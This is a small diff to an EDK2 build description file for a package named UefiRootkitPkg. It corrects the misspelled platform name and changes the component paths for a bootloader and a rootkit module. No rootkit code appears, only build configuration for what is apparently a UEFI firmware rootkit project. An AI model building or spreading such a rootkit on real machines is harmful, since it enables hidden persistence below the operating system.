@@ -1,5 +1,5 @@
 [Defines]
-PLATFORM_NAME                  = UefiRookitPkg
+PLATFORM_NAME                  = UefiRootkitPkg
 PLATFORM_GUID                  = af49bc4a-daa0-4348-92bb-9bdb7cf86c22
 PLATFORM_VERSION               = 1.0
 DSC_SPECIFICATION              = 0x00010005
@@ -30,5 +30,5 @@ PcdLib|MdePkg/Library/BasePcdLibNull/BasePcdLibNull.inf
 RegisterFilterLib|MdePkg/Library/RegisterFilterLibNull/RegisterFilterLibNull.inf
 
 [Components]
-bootloader/bootloader.inf
-rootkit/rootkit.inf
+UefiRootkitPkg/bootloader/bootloader.inf
+UefiRootkitPkg/rootkit/rootkit.inf
